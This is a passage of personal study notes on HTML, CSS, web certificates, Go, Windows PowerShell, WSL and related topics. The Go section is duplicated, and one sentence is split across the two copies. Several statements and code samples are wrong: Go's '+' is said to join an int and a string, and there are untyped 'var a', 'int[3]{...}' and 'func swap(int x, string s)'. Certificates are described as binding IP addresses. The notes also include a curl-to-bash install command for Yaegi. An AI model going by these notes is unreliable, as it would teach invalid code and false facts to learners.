    + Self-closing : ``<img src="img.png" />``
    + Note : the ending `/` is optional. It is common to put it anyway.
  * There are also two types of HTML tags
    + Online tags : ``<span>``, ``<em>``, ``<strong>``
    + Block tags : ``<div>``, ``<p>``, ``<hi>``
  * Tags have attributes : ``<tag attribute="value">``
  * The ``<html>`` tag contains all the html code.
  * The ``<head>`` tag contains nothing that will be displayed by browsers, just (useful!) meta information about the page.
  * The ``<body>`` tag contains every element that will be displayed on screen.
  * ``<meta charset="utf-8" />`` indicates the encoding of the file. UTF-8 is cool. Make sure your files are saved as utf-8.
  * Use ``<br>`` (or ``<br/>`` for carriage returns)
  * The ``<title>`` is what is displayed on top of the screen (on the tab in Chrome). It's also what's displayed on Google Searches
- Paragraph (``<p></p>``) tags for paragraphs
- ``<h1></h1>``...``<h6></h6>`` correspond to `#`...`######` in Markdown. 
- More generally there are many correspondences between Markdown and HTM(arkup)L : it is possible to use HTML tags in Markdown
- ``<strong>`` bits are displayed in **bold** by default. CSS allows to display ``<strong>`` parts as we want.
- Idem for ``<mark>`` (<mark>marked</mark>) parts. CSS allows to display them as we want.
- (Probably?) idem for ``<em>`` (<em>emphasized</em>) parts.
- Unordered lists with ``<ul>``. Text between the tag the the first element (``<ul>here<li>``) is aligned with the elements, without bullet point.
- It is possible to make sublists into lists - that is, floors.
- There are ordered (``ol``) and unordered (``ul``) lists (and definitions lists, but who cares about them). Items are delimited with ``<li>``.
- Hyperlinks require the ``<a href="link"></a>`` tag. 
  * You can put a hyperlink to another page of the same website : ``<a href="path/to/other/page.html>``.
  * Do not put spaces, uppercase letter, and special caracters (including 'é', 'è', 'à'...) in file or folder names.
  * You can put hyperlinks to different tags on the same page  : ``<tag id="tag_name">`` and then ``<a href="#tag_name>``. That's when you see ``#``'s in URLs !
  * NB : do not put spaces in ``id``s, you could encounter problems.
  * You can henceforth link to specific parts (tags) of other pages : ``<a href="ancres.html#rollers">``
  * You can put titles to hyperlinks : ``<a href title="A title that will be displayed when hoovering into the hyperlink">``
- ``id``'s are used to give (unique) identifiers to tags. They are used a lot to apply styles to specific things in CSS.
- You can insert images with ``<img src="montagne.jpg" alt="Photo de montagne" title="Montagne"/>>``. 
  * ``src`` is the (path to) the file (the image).
  * ``alt`` is used to describe the content of the image. It is the text that will be displayed if the image doesn't load. It's used by search engines to know what's supposed to be on the picture. 
  * Remember : do not put uppercase letters, spaces or special caracter in file or folder names (or paths).
  * ``title`` is the text that will be displayed in the info-bubble that will appear when hoovering the image.
  * Thumbnails : ``<a href="montagne.jpg"><img src="montagne_thumbnail" alt="montagne thumbnail" title=cliquez pour agrandir/></a>``
- Figures (``<figure>``) are a _semantic_ tag that allow to know that this tag is a figure used to illustrate some text.
  * It is possible to add the ``<figcaption></figcaption>`` tag that will add a caption underneath the figures.
- The ``<span>`` tag can be used to point at specific words (for CSS).
- The ``<div>`` tag can be used to point at to blocks of words (for CSS).

### CSS

- General facts
  * Comments are written using /* */
  * There are three ways (places) to write CSS :
    + In a ``.css`` file
    + In the header (``<head>``) of the HTML, using the ``<style>``tag. and closing) ``style`` tags.
    + Directly into the tags, using the ``style`` attribute. 
    + For the three methods, just write the css code normally, either between the ``<style>`` tags, or between quotation marks for the ``styte`` attribute.
    + The first method is widely used and highly recommended.
  * Use ``<link rel="stylesheet" href="style.css" />`` to indicate the CSS file associated to the HTML page (file).
- General syntax : 
```css
tag1
{
  property1: value;
  property2: value;
  property3: value;
}

tag2, tag3
{
  property4: value;
  property5: value;
  property6: value;
}
.classname
{
  property7: value;
  property8: value;
  property9: value;
}
```
- Properties
  * ``color`` indicates the color of the text. Default is black. It is possible to write it as ````, with ``a``,``b``,``c`` integers in base 10.
  * ``font-size: 1em``. Default is ``16px``, or ``12pt``, or **``1em``**.
    + Absolute value : in ``px``, ``pt``, ``em``, ``in``, ``cm``...
    + Note : ``em`` corresponds to the default font size value. Conversely the default font size value is ``1em`` !
    + Relative value : ``xx-small``, ``x-small``, ``small``, ``medium``, ``large``, ``x-large``, ``xx-large``, 
    + Relative values are recommended : will fit better on different screen/window sizes, might better adapt to browser zooming...
  * ``font-family: font;``
    + By default, the browser will search on the (local !) client computer if the font ``font`` exists. 
    + If it does not exist, the browser will render with a default font (which is ``Times New Roman`` for Chrome...!)
    + You can specify multiple fonts : ``font-family: font1, font2, font3, font4;``
    + The last font is often ``serif``. Éventuellement ``sans-serif``.
    + ``Arial``, ``Arial Black``, ``Comic Sans MS``, ``Courier New``, ``Georgia``, ``Impact``, ``Times New Roman``, ``Trebuchet MS``, ``Verdana`` are classical fonts that work well on all browsers (but not very original).
    + [Here is an updated list of CSS secure fonts](https://www.w3schools.com/cssref/css_websafe_fonts.php)
    + **If the font name contains spaces, it is mandatory to enclose it in quotation marks** ! (Keep quotes around font names)
    + It is also (fortunately!) possible to make the browser download a font.
    + ``fontsquirrel.com`` or ``dafont.com`` provide copyright-free fonts. ``fontsquirrel.com`` also provides "CSS 3 packs", with multiple formats.
    + Some font formats include : 
      - ``.ttf``, TrueType Font. The most standard one, seemingly.
      - ``.eot``, Embedded OpenType. Works on Internet Explorer only. Proprietary format, owned by Microsoft.
      - ``.otf``, OpenType Font. 
      - ``.svg``, Scalabe Vector Graphics. 
      - ``.woff``, Web Open Font Format.
    + Note : Font files, such as TrueType Font (.ttf) files, are not text files, so they are not typically associated with a specific character encoding like UTF-8, ANSI, or Unicode. Instead, they are binary files that contain a mix of binary data, structured tables, and occasionally embedded metadata that might include text strings.
    + Note : Some fonts are the same whatever ``font-weight`` you give them. Sometimes ``font-weight`` (boldness) does not impact the font !
    + To know whether a given font format works on which browser : 
      - ``https://www.lambdatest.com/web-technologies/eot``
      - ``https://www.lambdatest.com/web-technologies/woff``
      - ``https://www.lambdatest.com/web-technologies/ttf``
      - Note : ``https://www.lambdatest.com/web-technologies/otf`` does not exist. ``CTRL+F`` (or ``F3``) on ``https://www.lambdatest.com/web-technologies/`` yields that it is actually together with ``https://www.lambdatest.com/web-technologies/ttf``
  * **Declaring a new font** 
```css
@font-face {
font-family: 'Font Name';
src: url('path/to/font.ttf');
}
```
  * Importing multiple formats can be a good habit, browsers will automatically select their preferred format (one that they support) :
```css
@font-face {
    font-family: 'Font Name';
    src: url('Font Name.eot') format('eot'),
         url('Font Name.woff') format('woff'),
         url('Font Name.ttf') format('truetype'),
         url('Font Name.svg') format('svg');
}
```
  * ``font-style``
    + ``normal``
    + ``italic``
    + ``oblique``
    + ``oblique`` is kinda like ``italic`` but different. It's actually like ``italic`` by default (with the default ``Times New Roman`` font)...
  * ``font-weight``
    + ``normal``
    + ``bold``
    + Note : as already mentionned before, some fonts are unaffected by the ``font-weight`` property : they can't be bold.
  * ``text-decoration``
    + ``underline``
    + ``line-through`` : Strikethrough 
    + ``overline`` : Overline
    + ``none``
  * ``text-align``
    + ``left``
    + ``center``
    + ``right``
    + ``justify``
    + Only works for block tags, not for inline tags
  * ``float``
    + For images essentially, can apply to other things aswell (charts, buttons, ...). 
    + Allows text to float around an image : it's like the image was inserted into the text, and the text moved a bit to give the image some room.
    + ``<img src="...", alt="Image flottante", style="float: right/left/center"
            />
  * ``clear``
    + This allows to _stop text from floating_. 
    + It basically says : Yes, the image (or whatever thing has the attribute ``float``) was supposed to be "inserted" into the text (allowing text to float around it), but no, the following text (enclosed in the tag that has the (style) attribute ``clear``) should not.
    + More specifically: 
      - ``clear: left`` means stop floating around things floating left (``float: left``)
      - ``clear: right`` means stop floating around things floating right (``float: right``)
      - ``clear: both`` means stop floating around both
  * ``background-color``
    + The background color of an element. It may be a div, a span, some text... For text, it will be text highlighting.
    + To set the page background color : 
```css
body
{
    background-color: black; /* Page background color */
    color: white; /* Text color (important) */
}
```
* ``background-image``
  * You can set the background color and background image to any HTML element.
- **Heritage**
  * Any CSS property given to a tag will apply to **all children**.
  * Hence the name : **Cascading Style Sheets** !
  * Note that since all tags are children of the ``<body>`` tag, properties given to ``<body>`` will apply to everyone by default (except told otherwise, cf. next point)
  * Priority rules apply from narrowest to broadest (intuitively).
- It is possible to specify colors using either
  * Hexadecimal notation
  * RGB colors (``rgb(a,b,c)`` with ``a,b,c`` integers in base 10)
  * Hexadecimal colors
  * Hexadecimal colors with transparency
  * RGB colors
  * RGBA colors
  * HSL colors
  * HSLA colors
  * currentcolor : refers to the ``color`` property of the element. Will be black (default) is the HTML element has no ``color`` property given by CSS.
  * [One of the 140 predefined CSS colors](https://www.w3schools.com/cssref/css_selectors.php)
- Selectors :
  * ``id`` and ``class`` are attributes that work for **all** HTML tags.
    + Use ``.class_name`` to refer to the tags that have this class. 
    + Classes are used to group elements.
    + Use ``#id_name`` to refer to the tags that have this id.
    + Ids are used to point specific elements. 
    + It looks like they work the same anyway (i.e. it looks like you can group things using ``id``, and the behaviour remains the same) but don't play with fire too much.
  * The ``<span>`` tag can be used to refer to specific words.
  * The ``<div>`` tag can be used to refer to blocks of words.
  * ``A,B,C,D {...}`` will refer to all occurences of A,B,C and D (without having to copypaste)(A,B,C,D can be ``h1, em, .class_name, #id_name).
  * ``*`` is the universal selector : ``* {...}`` will apply to _all_ tags.
  * ``A B`` will refer to all occurences of B **contained in** an occurence of A.
  * ``A + B`` will refer to all occurences of B **right after** an occurence of A.
  * ``A[attr]`` will refer to all occurences of A **that do have** the attribute ``attr`` (set to some value).
  * ``A[attr="value"]`` will refer to all occurences of A that **have** the attribute ``attr``  **set** to value ``value``.
  * ``A[attr*="value"]`` will refer to all occurences of A that **contain** ``value`` in their attribute ``attr``.
  * Other selectors : https://www.w3.org/Style/css3-selectors-updates/WD-css3-selectors-20010126.fr.html
  * [Comprehensive list of CSS selectors](https://www.w3schools.com/cssref/css_selectors.php)

### Django

Replace this section by "Backend" ?

Uninstalled migrations -> python -m django manage.py migrate

```You have 21 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions, wordcounter.     Run 'python manage.py migrate' to apply them.```

### Further reading and tools

- World Wide Web Consortium :
  * https://www.w3.org/
- W3Schools
  * https://www.w3schools.com/
  * HTML, CSS, JavaScript, SQL, Java, PHP, Typescript, Angular, Vue, Node, Git, XML, Django, C, C++...
  * Useful to refresh stuff, but not necessarily to learn.
- All HTML Tags 
  * https://www.w3schools.com/tags/default.asp
- CSS Compaptibility tables
  * https://www.caniuse.com
  * https://www.normansblog.de
- Further reading on CSS, on W3C : 
  * https://www.w3.org/Style/
- Lea Verou : an inspiring Web Designer
  * https://projects.verou.me/css3patterns/
- CSS 3 Patterns, and more
  * https://tailwindcss.com/ (Used on bulle.rezel.net !)
  * https://css-pattern.com/
  * https://10015.io/tools/css-background-pattern-generator
  * https://cssgradient.io/blog/gradient-patterns/
  * https://bansal.io/pattern-css
- Magic Pattern
  * https://www.magicpattern.design
  * https://www.magicpattern.design/tools/css-backgrounds
- Free Frontent
  * https://freefrontend.com/
  * https://freefrontend.com/css-background-patterns/
- Design
  * https://superdesigner.co/tools/css-backgrounds
- Bootstrap
  * https://www.w3schools.com/bootstrap/bootstrap_ver.asp
- Resources for Developers, by Developers
  * https://developer.mozilla.org/en-US/
- Web.dev
  * https://web.dev/
- HTML, CSS, JavaScript, SVG, JS API (and more) **browser compaptibility tests**, and (importantly) **features** (possibilities) :
  * https://www.lambdatest.com/web-technologies/
- Tests for web-related stuff :
  * https://www.lambdatest.com/
- Echo framework for Go 
  * https://echo.labstack.com/docs

### Web certificates

- Web authenticity certificates are used to certify that someone talking to an IP address (or domain name) gets server responses that _are indeed_ sent by the right server, and not by some other machine that attempts to send you something else.
- This is (would be) called a **man in the middle** attack.
- Note that this kind of authentification is analoguous to what does the ``known_hosts`` file for SSH connections.
- When hosting a HTTPS website, say ``https://www.rezel.net`` for instance, you have to contact a [Certificate authority](https://en.wikipedia.org/wiki/Certificate_authority) that will sign a certificate linking the web server's IP adress to its public key. 
- More precisely, a Web certificate contains, amongst [other things](https://en.wikipedia.org/wiki/Public_key_certificate#Common_fields) :
  * An emission date
  * An expiration date
  * The server's public key
  * The server's IP address
- The Certificate Authority then computes a signed hash of this data and gived is it to the domain name owner. The web server then gives the certificate among with the signed hash with all the requests it sends.
- The signature validates the _coherence_ of the information contained in the certificate, i.e. the coherence between all _certificate fields_ : the signature ensures that, for instance, the domain name ``https://www.rezel.net`` is linked to the Public key ``f60473d34377c4a094027fde23d4efb19deba0a36101d6c3ed7a3e314dcca142``.
- Client browsers can check that the signature is legitimate. This is most likely done by decrypting the signature itself using the Certificate authority's public key. Recall that only someone who has a private key can encrypt something that can be decoded usign the public key. Hence, if the fingerprint can be decoded, it means that the certificate is legit.
- Client browsers that recieve data from a distant server whose certificate is inexistant or not signed by a Certificate Authority will reject the data and tell the user that the website is not secure. Note that the browser will still often let the user access the website, but will warn the user that the website might be dangerous as the certificate is invalid.
- Acquiring a certificate is a procedure named [Certificate signing request](https://en.wikipedia.org/wiki/Certificate_signing_request). 
  * When requesting a certificate, the latter neither has an emission date, nor does it have an expiration date. These are decided and set by the Certificate Authority, when giving the (signed) certificate back. 
  * The certificate authority will ask the requester to certify its identity : by asking him to make the domain name point to some random text. (Note : the DNS is a complex system, it can be used to make a domain name point to basically anything : some text...)

### Web hosting

- Proxies, reverse-proxies, are often used. Firewalls are always used. 
- When hosting a website, you must always specify the port the server is listening onto. 
- Requests : port 3000 (cf. https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers port 3000) or 80/443 (HTTP/HTTPS) ? (...)
  * How com Sacha Montel's website listens on port 8080 and not 43 ?? When browsers emit requests, they should emit either on 80 or 443 don't they ?

### Identity providers

#### Authentik

### Self-hosting

#### CodiMD

CodiMD is what Rezel hosts for its self-hosted collaborative markdown notes.

#### HedgeDoc

HedgeDoc is a fork of CodiMD.
Apparently, a lot of people say that when HedgeHoc 2.0 will come out, it'll be amazing. :O

### Web miscellaneous things

## Go

### Go basics 

- Go is a compiled language. 
  * ``go build file.go`` to compile a go file. Then, run the executable (``./file``)
  * ``go run file.go`` performs the same operation, but stores the excutable somewhere, runs it, and then deletes it. It's very useful for one-shots.
- The first line of a file indicates the package the file is in.
  * Every Go program is organized in a package. 
  A package is a collection of source files in the same directory that allows variables, types, and functions to be visible among other source files within the same package. 
  * For standalone fi
- Package importation :
  * ``import package`` or `import path/to/package`
- Variables must be declared before being assigned.
  * Either declared and assigned in one go :
    + `var f = 5`
    + `var g int = 5`
    + `var j, k = false, 5`
    + `var l, m bool = false, true`
  * Or, declared, and then assigned (they can be declared outside functions and assigned in a function)
```go 
  var (
	  b bool
  	c float32
	  d string
  )
  
  b, c = true, 32.0
```
  * Or declared and assigned in one go using the `:=`constructor :
    + `e := 5`
	  + `h, i := true, "indeed"`
  * Note that **outside a function, every statement begins with a keyword** (var, func, and so on) and so the := construct is not available.
- When a variable is declared it is assigned the natural "null" value of the corresponding type. 
  * For example, ``var k int`` assigns k to the value ``0``
  * ``var s string`` assigns s to the value ``""``.
- Declaring and assigning values :
  * ``var x = 5``
- Go handles a short variable declaration, without keyword : 
  * `k := 3`
  * Note that **outside a function, every statement must begin with a keyword** (var, func, ...). The `:=` construct is hence not available.
- Available types include :
  * ``uint8``
  * ``uint16``
  * ``uint32``
  * ``uint64``
  * ``int``
  * ``int8``
  * ``int16``
  * ``int32``
  * ``int64``
  * ``float32``
  * ``float64``
  * ``complex64``
  * ``complex128``
  * ``bool``
  * ``string`` (UTF-8)
- ``int`` is ``int32`` on 32-bits systems, and ``int64`` on 64-bits systems. 
- The Go documentation says to use `int` unless you have a specific reason to use a fixed-size ``intXX`` type. les, the package is called main, but the name of the file is decided by the programmer.
  * The ``fmt`` package that implements formatted I/O.
  * All go files start with ``package [packagename]``. When importing, one imports ``path/to/package``. _Bref_, the packagename is the last element of the import path. For instance, the "math/rand" package comprises files that begin with the statement ``package rand``.
- Package importation :
  * ``import package`` or `import path/to/package`
- Variables must be declared before being assigned.
  * Either declared and assigned in one go :
    + `var f = 5`
    + `var g int = 5`
    + `var j, k = false, 5`
    + `var l, m bool = false, true`
  * Or, declared, and then assigned (they can be declared outside functions and assigned in a function)
```go 
  var (
	  b bool
  	c float32
	  d string
  )
  
  b, c = true, 32.0
```
  * Or declared and assigned in one go using the `:=`constructor :
    + `e := 5`
	  + `h, i := true, "indeed"`
  * Note that **outside a function, every statement begins with a keyword** (var, func, and so on) and so the := construct is not available.

- When a variable is declared it is assigned the natural "null" value of the corresponding type. 
  * For example, ``var k int`` assigns k to the value ``0``
  * ``var s string`` assigns s to the value ``""``.
- Declaring and assigning values :
  * ``var x = 5``
- Go handles a short variable declaration, without keyword : 
  * `k := 3`
  * Note that **outside a function, every statement must begin with a keyword** (var, func, ...). The `:=` construct is hence not available.
- Available types include :
  * ``uint8``
  * ``uint16``
  * ``uint32``
  * ``uint64``
  * ``int``
  * ``int8``
  * ``int16``
  * ``int32``
  * ``int64``
  * ``float32``
  * ``float64``
  * ``complex64``
  * ``complex128``
  * ``bool``
  * ``string`` (UTF-8)
- ``int`` is ``int32`` on 32-bits systems, and ``int64`` on 64-bits systems. 
- The Go documentation says to use `int` unless you have a specific reason to use a fixed-size ``intXX`` type. 
- Aliases :
  * ``byte`` is an alias for ``uint8``
  * ``rune`` is an alias for ``int32``
  * ``int`` is an alias for ``int32`` on 32-bits systems, and ``int64`` on 64-bits systems. 
- Not unsigned (i.e., signed) int types use two's complement. 
  * In particular, on 64-bits systems, 
  * Note that the bitwise left-shift (`<<`) operator doesn't let you shift until you reach the right-most bit that's supposed to represent the sign. 
  * i.e., on 64-bits systems for instance, `1<<63` does not work, although it could yield $-2^63$.
  * This is likely for security reasons (doesn't let you do something that would yield something you didn't expect).
- The Go compiler isn't happy when you declare variables that aren't used...
- But it will let you declare functions without using them.
- ``fmt.Printf()`` allows to print formatted text to standard output, just like ``printf`` in C.
  * It uses _verbs_ : ``fmt.Print("The value of x is : %d",x)``
  * Go _verbs_ include :
    + ``%v`` : The value in a default format
    + ``%+v`` : Same as ``%v``, but adds field names when printing structs
    + ``%#v`` :	a Go-syntax representation of the value
  (floating-point infinities and NaNs print as ±Inf and NaN)
    + `%T`: a Go-syntax representation of the type of the value : `int`, `float64`...
    + `%%` : The way to write a percent `%` sign (without it being interpreted as a verb attempt)
    + See more in our breakdown of the [fmt](#fmt) package.
- ``fmt.Println()`` allows to print stuff without bothering with ``%T``, ``%d``...
```go
package main

import "fmt"

/* Declare a single variable */
var a

/* Declare a group of variables */
var (
    b bool
    c float32
    d string
)

func main() {
  a = 42                  // Assign single value
  b, c = true, 32.0       // Assign multiple values
  d = "string"            // Strings must contain double quotes

  e := 5                  // Declare and assign a variable in one go

  const f = 2            //
  x, y := true, false  // bool


  fmt.Println(a, b, c, d) // 42 true 32 string
}
```
- **Exported names** : As said before, variables, types, and functions declared in a file associated to a package `package` are visible among other source files within the same package. This is actually only partially true : it is only true for **exported names**. Exported names are the names that start with a capital letter. Exported names will be seen from other source files in the same package. For instance, `import "math"` allows to write `math.Pi` to display the value of $\pi$, but `math.pi`won't work.
- Functions are declared like so :
  * ```go
    func add(x int, y int) int {
      return x + y
    }
    ``` 
- Note that the types are after each argument variables, and the return type of the function (if any)(i.e. : if the function returns something - if the function does not return anything, then nothing shoud be written between `(...args...)` and `{ ... }` is after the arguments of the function.
- It is possible to omit the types of some consecutive variables that have the same type but indicating their type only at the last one :
  * ```go
    func mul(x, y int, s string) int {
      fmt.Println("Multiplying", x, "and", y, "together. Additional message :", s)
      return x*y
    }
    ```
- If the function returns several values (as a tuple), the return should be indicated as follows :
  * ```go
    func swap(int x, string s) (string, int) {
      return s,x 
    }
    ```
- **Naked returns**
  * If you see a `return` at the end of a function... that's _naked_, i.e. just a `return` without anything right after it (not `return ...`, just `return`), it's a _naked return_. In this case, the return values are specified where the function return value types are specified (at the very beginning, between `(arguments)` and `{code}`). The return variable names are then specified there, and a naked return is possible :
  * ```go
    func split(sum int) (x, y int) {
      x = sum * 4 / 9
      y = sum - x
      return
    }
    ```
  * Naked return statements should be used only in short functions, as with the example shown here. They can harm readability in longer functions.
- Operators : 
  * `+`, `-`, `*`
  * If one of its arguments is a `string`, `+` will automatically cast its other argument into a string and concatenate them (as strings). Example : `5 + "i"` returns the string "5i".
  * The `/` operator rounds up **towards zero**, if both arguments are `int`s, otherwise it'll be a float) : `-1/2` returns 0, `0.5/2` returns `0.25`
  * The bitwise left shift `<<` (and the bitwise right shift `>>`) do what we expect they do.
  * Not that for all int types (recall that all int types are fixed-sized, somethimes signed using two's complement, sometimes not)
- Type conversions : 
  * The expression `T(v)` converts the value `v` to the type `T`.
  * Example : `r := float64(5)`
- Type inference : 
  * When the types aren't statically precised, they are inferred. 
  * Examples :
    + `i := 42` defines an `int`
    + `f := 3.142` defines a `float64`
    + `g := 0.867 + 0.5i` defines a `complex128`
    + Recall that `fmt.Printf("v is of type %T\n", v)` will print the type of `v`
- Constants
  * Constants are declared using the `const` **before** the variable.
  * `const x = 5`
  * Constants can be character, string, boolean, or numeric values.
  * Constants cannot be declared using the := syntax.
  * Constants can also be declared in groups, as with `var`, like so : 
  * ```go
    const (
        a int = 5
        b     = "a"
      )
    ```
- Go supports chain commands separated by semicolons : 
  * `x := 0 ; x++ ; fmt.Println(x) ; x++ ; fmt.Println(x)`
- You can "manipulate" integers that are over $2^63$ in `consts`.
  * You can define `const big = 1<<100` and even `const big 1<<100 + 1`.
  * But once defined, constants cannot be edited. 
  * Doing this, the `const` **does not have a type**. It is an **untyped const**.
  * You cannot cast them as `int`s because of overflow. 
  * You cannot `Println` them beccause that requires to convert the `const` to have a type.
  * You can cast them as `float64`s because... idk why, but it works. It will yield a float of the type `1.2676506002282295e+29`.
- For statements : 
    * ```go
      for n := 0; n <= 10; n++ {
          fmt.Println(sum_of_squares(n))
        }
      ```
  * The first and last statements are optional !
  * ```go
    sum := 1
    for ; sum < 1000; {
      sum += sum
    }
      * But at that point... This is just a while loop. You can drop the semicolons !
    ```go
    sum := 1
    for sum < 1000 {
      sum += sum
    }
    ```
  * Hence, `for` is go's spelling of `while` loops.
  * You can even do "while true" loops by ommiting everything !
  * ```go
    for {
    }
    ```
- If statements 
  * They can, but need not to, have curly braces arount their condition, and require curly braces.
  * ```go
    if n >= 0 {
      return true
    }
    ```
  * It is possible to add a short statement before the `if` condition. Variables declared in the statement will only exist in the scope of the `if`.
  * ```go
    if v := math.Pow(2, 10); x < v {
      return true
    }
    ```
  * Add an `else` like so :
  * ```go
    if v := math.Pow(2, 10); x < v {
      return true
    } else {
      return false
    }
    ```
  * Variables declared inside an if short statement (i.e. in the short statement between the `if` keyword and the short statement condition) are also available inside any of the else blocks.
- Switches
  * They work like so
  * ```go
    switch p := n; p {
      case 0:
        fmt.Println("aa")
        return true
      case 1:
        return true
      default:
        return false
      }
    ```
  * You can write short statements as in `if`s, as seen earlier.
  * Note that it's kinda weird that Go suddently uses colons to indicate the content of the `case`s, while still using curly braces for `if`s, `for`s... ¯\_(ツ)_/¯
  * Note that `switch true` allows to write long if-elif-elif chains :
  * ```go
    t := time.Now()
    switch true {
    case t.Hour() < 12:
      fmt.Println("Good morning!")
    case t.Hour() < 17:
      fmt.Println("Good afternoon.")
    default:
      fmt.Println("Good evening.")
    }
    ```
  * This tests every condition and runs the appropriate one. _Bref_, this is a is-elif-elif chain.
  * Hence, in this `true` can be ommited : `switch {...}` is the same as `switch true {...}`
  * ```go
    t := time.Now()
    switch {
    case t.Hour() < 12:
      fmt.Println("Good morning!")
    case t.Hour() < 17:
      fmt.Println("Good afternoon.")
    default:
      fmt.Println("Good evening.")
    }
    ```
- Defers
  * The `defer` keyword defers (this means : postpones) the execution of a function to after the current function returns.
  * The deferred call's arguments are evaluated immediately, but the function call is not executed until the surrounding function returns.
  * ```go
    func main() {
      defer fmt.Println("world")

      fmt.Println("hello")
    }
    ```
  * When having several `defer`s, their function calls are pushed onto a stack.
  * Hence, they will be executed in reverse order.`
  * ```go
    func main() {
      fmt.Println("counting")

      for i := 0; i < 10; i++ {
        defer fmt.Println(i)
      }

      fmt.Println("done")
    }
    ```
- Pointers
  * The type `*T` is the type "Pointer to a value of type `*T`"
  * The `&` operator returns a pointer to its operand.
  * i.e., if `x` is anything, `&x` will return a pointer to `x`.
  * The `*` operator returns the pointer's underlying value.
  * i.e., if `x` is _a pointer_, `*x` returns the value `x` points to.
  * This is known as "dereferencing" or "indirecting".
  * Unlike C, Go has no pointer arithmetic.
  * By definition, if `p` points to `x`, it changes pretty much nothing to manipulate `*p` or `x` (whether it be in reading access or writing access)
- Structs
  * A struct is a collection of fields. If is analoguous to the constructuon `type` in OCaml.
  * Example : 
  * ```go
    type Vertex struct {
      X int
      Y int
    }

    fmt.Println(v := Vertex{1,2},v.X,v.Y)
    v1 = Vertex{1, 2}  // has type Vertex
	  v2 = Vertex{X: 1}  // Y:0 is implicit
	  v3 = Vertex{}      // X:0 and Y:0
	  p  = &Vertex{1, 2} // has type *Vertex
    fmt.Println(v1,v2,v3,p,*p)
    ```
  * If you have a pointer `p` to a struct `v`, you can access the fields of `v` with `(*p).field`.
  * This is kind of cumbersome. Hence, Go allows to access these using `p.X`, without explicit dereference.
- Arrays
  * The type `[n]T` is an array of n values of type `T`.
  * Declaration and initialization go as follows : 
  * ```go 
    var a [3]int 
    var b [3]int = [3]int{1,2,3}
    var c = [3]int{1,2,3}
    d := int[3]{1,2,3}
    ```
  * `a[i]` then accesses the i-th element of `a`.  
  * An array's length is part of its type, so arrays cannot be resized. Slices offer a dynamic solution to this problem/
  * You can get the length of an array with `len(arr)`.
- Slices 
  * An array has a fixed size. A slice, on the other hand, is a dynamically-sized, flexible view into the elements of an array. In practice, slices are much more common than arrays.
  * The type `[]T` is a slice with elements of type `T`.

### fmt

Printf, all %... verbs
Println, \n  support

### math

MaxInt uint64     = 1<<64 - 1
z      complex128 = cmplx.Sqrt(-5 + 12i)

#### math/cmplx

math.Sqrt(x)
Sqrt(-2)
Sqrt(-5 + 12i)

#### math/rand

rand.Intn(10)
Mod
Power

#### time

today := time.Now().Weekday()
time.Saturday 
today + 0:
today + 2:

### Go interpreters 

#### Yaegi

- Yaegi is a Go interpreter made my [Traefik Labs](https://github.com/traefik/yaegi).
- Yaegi stands for "Yaegi is Another Elegant Go Interpreter". :O
- It can have some bugs (but not too much, at least not for a simple usage of Go.
- **Installation :**
  * As a Go package
    + `import "github.com/traefik/yaegi/interp"`
  * As a Command-line executable
    + `go install github.com/traefik/yaegi/cmd/yaegi@latest`
    + Or `sudo apt install yaegi`
    + Note that you can use `rlwrap` (install it `apt` or any other package manager), and alias the `yaegi` as `rlwrap yaegi` in `~/.bashrc`, to have history and command line edition.
    + Otherwise the history won't be accessible.
  * For CI integration
    + `curl -sfL https://raw.githubusercontent.com/traefik/yaegi/master/install.sh | bash -s -- -b $GOPATH/bin v0.9.0`
- The go interpreter command prompt is... kinda shitty by default 
  * (unable to use arrow keys, no command history...)
  * Use rlwrap to bypass this issue :)
- It doesn't always work quite well. 
  * Try compiling the following code
  * ```go
    	primes := [6]int{2, 3, 5, 7, 11, 13}
	    var s []int = primes[1:4]
    ```
  * And then try to interpret it with yaegi. 
  * ...it doesn't work.

### Echo web framework

- https://github.com/labstack/echo
- https://echo.labstack.com/
- https://echo.labstack.com/docs/quick-start

## Python 

### Python virtual environments

```
python3 -m venv .venv (on signale qu'on utilise un module depuis python)
source .venv/bin/activate

pip install ..., pip install ..., ...
```

## Windows 

### Windows Powershell

- Variables d'environnement
  * Pour afficher une variable d'environnement, par exemple (au hasard) PATH : ``echo $env:path``
  * Pour toutes les afficher : ``gci env:``, ou ``ls env:`` (``gci`` est l'alias de ``Get-ChildItem``, comme ``ls``)
- ``systeminfo`` sur Windows pour avoir des informations sur le système
- Infinite loop in PowerShell : ``while ($true) { DoStuff } ``
- Infinite loop in ``cmd`` (or batch script) : ``for /l %n in (1,0,10) do (DoStuff)`` for instance (for loop, from 1, to 0, with increment 10)(lol)
- Shutting down :
  * ``shutdown | shutdown /?``  to show help
  * ``shutdown /t 0`` to shutdown now
  * ``shutdown /r`` to reboot
  * ``shutdown /r /t 0`` to reboot now
  * ``shutdown /a`` to cancel planned shutdown

### WSL

- To activate (or [install](https://learn.microsoft.com/en-gb/windows/wsl/install)) [WSL](https://learn.microsoft.com/en-us/windows/wsl/setup/environment) : 
  * ``wsl --install`` in a Powershell.
  * Reboot. If a text apprears, it means that WSL is already active (go to next step)
  * ``wsl --list --online``, or ``wsl -l -o.`` : display list of available distributions
  * ``wsl --install -d Ubuntu`` or ``wsl --install -d Debian`` for instance to install a specific distribution.
  Note : If ``wsl --install`` displays a help message, specify the distribution (according to what has just been said)
  * In case of errors :
    - ``wsl --set-default-version 2`` sets up WSL's default version to WSL _2_, which can get it to work
    - ``wsl.exe --update`` updates WSL
    - [Install manual](https://learn.microsoft.com/en-gb/windows/wsl/install-manual)
- WSL is very cool, but not for computer notworking. Use Linux.

### Windows miscellaneous information

- Open the Run Command dialog (``WIN+R``) and type ``shell:AppsFolder``to get a pretty exhaustive list of installed apps/softwares on the OS. Very useful for setting up a shortcut to open them (WhatsApp for instance) ! Create a shortcut, ``sh.lnk`` for instance, place it somewhere accessible from the PATH environment variable (``~`` for instance) and typing ``sh`` in the Run Command dialog (``WIN+R``) will open it !
- Paint is opened with the ``mspaint.exe`` executable file located in `` C:\WINDOWS\system32``, which is in the PATH environment variable : ``WIN+R`` and ``mspaint`` opens it.
- If, especially when trying to backup, some folders like Pictures, Videos, Documents... don't appear in the `~`, they may be in `~/OneDrive` (i.e., OneDrive has been configured on this hard drive)! (cf. Adventures with Paola and her hard drive)

## SSH

### How SSH works

- Cryptography (in general) must ensure the three following fundamental principles : 
  * **Authenticity** : The person who talks _is indeed_ who they pretend they are. No one can steal anyone's identity.
